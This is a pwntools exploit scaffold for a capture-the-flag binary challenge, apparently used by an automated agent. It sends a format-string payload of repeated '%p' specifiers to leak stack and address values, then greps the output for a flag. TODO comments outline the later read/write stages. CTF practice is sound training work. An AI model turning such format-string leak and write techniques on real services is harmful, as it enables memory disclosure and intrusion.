#!/usr/bin/env python3
from pwn import *
import os, re

BIN = os.getenv("BIN", "./chall")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

context.binary = ELF(BIN, checksec=False) if os.path.exists(BIN) else None
context.log_level = os.getenv("LOG", "info")


def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def scan(data: bytes):
    print(data.decode(errors="replace"))
    m = re.search(FLAG_RE, data)
    if m:
        flag = m.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


io = start()
# Leak-first canary. Replace with ctf-pwn-format-map findings before %n.
payload = os.getenv("FMT", "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p").encode()
# TODO: sync prompt if needed: io.sendlineafter(b'> ', payload)
io.sendline(payload)
data = io.recvall(timeout=3)
scan(data)

# TODO after ctf-pwn-format-map:
# - identify controlled offset
# - classify leaks: PIE/libc/stack/canary
# - build final read/write only after leak class and target are known
